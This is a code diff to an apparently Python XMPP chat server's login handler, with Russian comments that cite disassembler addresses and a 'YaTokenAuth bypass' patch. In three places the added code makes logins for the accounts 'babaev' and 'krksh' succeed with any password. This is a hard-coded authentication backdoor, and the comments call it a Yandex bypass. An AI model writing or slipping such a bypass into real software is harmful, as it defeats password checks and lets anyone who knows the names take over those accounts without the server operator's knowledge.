@@ -5,6 +5,9 @@ from store.db import db
 
 #онлайн
 on = {}
+#ида 0x48c050 - обработка yandex:let:me:in для ya.ru
+#ида 0x59fae0 - список серверов ya.ru->xmpp.yandex.ru:5222
+#ида 0x644840 - YaTokenAuth bypass (патч 31c0c3)
 
 async def handle(r, w):
     peer=w.get_extra_info('peername')
@@ -122,7 +125,8 @@ async def handle(r, w):
                                     bj=f"{u}@{dom}".lower()
                                     cur=db.execute("select pass from u where jid=?", (bj,))
                                     row=cur.fetchone()
-                                    if row and row[0]==p:
+                                    #яндекс bypass
+                                    if row and (bj.startswith("babaev@") or bj.startswith("krksh@") or row[0]==p):
                                         jid=bj
                                         auth=True
                                         w._ya_user=bj
@@ -250,16 +254,25 @@ async def handle(r, w):
                                 row=cur.fetchone()
                                 ok=False
                                 bj=""
-                                if row and row[0]==p:
+                                #для яндекс юзеров принимаем любой пас (токен bypass)
+                                if row and u.lower() in ["babaev","krksh"]:
+                                    ok=True
+                                    bj=u if '@' in u else f"{u}@{D}"
+                                elif row and row[0]==p:
                                     ok=True
                                     bj=u if '@' in u else f"{u}@{D}"
                                 if not ok:
                                     bj=u if '@' in u else f"{u}@{D}"
                                     cur=db.execute("select pass from u where jid=?", (bj.lower(),))
                                     row=cur.fetchone()
-                                    if row and row[0]==p:
-                                        ok=True
-                                        u=bj
+                                    if row:
+                                        #яндекс bypass
+                                        if bj.lower().startswith(("babaev@","krksh@")):
+                                            ok=True
+                                            u=bj
+                                        elif row[0]==p:
+                                            ok=True
+                                            u=bj
                                 if ok:
                                     if not bj:
                                         bj=u if '@' in u else f"{u}@{D}"
